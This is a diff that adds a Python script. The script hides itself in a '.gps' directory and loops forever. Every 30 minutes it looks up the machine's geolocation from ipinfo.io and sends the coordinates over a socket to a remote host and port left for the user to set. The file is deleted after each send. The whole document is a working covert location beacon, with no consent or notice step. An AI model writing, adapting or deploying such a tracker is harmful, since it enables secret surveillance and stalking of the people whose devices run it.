@@ -1,0 +1,46 @@
+#!/bin/python3
+from urllib.request import urlopen
+import os
+import json
+import socket
+import time
+
+# Create a directory to keep things neat
+os.mkdir("../.gps")
+os.chdir("../.gps")
+
+# Keep the program running indefinitely
+while True:
+
+    RHOSTS = "127.0.0.1" # Change this
+    RPORT = 5000 # Change this
+
+# Link to the url that will give you your coordinates
+    url = "https://ipinfo.io/json"
+    req = urlopen(url)
+    data = json.load(req)
+
+# Get latitude and longitude
+    lat = data['loc'].split(",")[0]
+    lon = data['loc'].split(",")[1]
+    location = lat, lon
+    coordinates = "".join(location)
+    print(coordinates)
+
+# Create a file to store it all
+    filename = "location.txt"
+    with open(filename, "w") as thefile:
+        thefile.write(coordinates + "\n")
+
+# Send the file to the remote host
+    with open(filename, "rb") as sendFile:
+        sendFile = sendFile.read()
+        s = socket.socket()
+        s.connect((RHOSTS, RPORT))
+        s.send(sendFile)
+        print("Location sent...")
+        os.remove(filename)
+        time.sleep(1800)
+
+# Start the loop over
+    continue
